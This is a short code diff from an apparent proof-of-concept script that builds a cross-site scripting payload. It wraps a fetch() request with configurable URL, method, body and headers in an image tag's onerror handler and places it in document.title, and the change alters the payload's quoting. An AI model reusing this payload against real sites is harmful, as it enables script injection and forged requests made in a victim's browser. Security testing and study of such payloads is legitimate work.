@@ -21,7 +21,7 @@
       };
 
       var fetchString = 'fetch("' + url + '", {method: "' + method + '", body: ' + body + ', headers: ' + JSON.stringify(headers) + '})';
-      var XSS = '<img src="/" onerror="' + fetchString + '"/>';
+      var XSS = '<img src="/" onerror=' + fetchString + '/>';
 
       document.title = XSS;
 
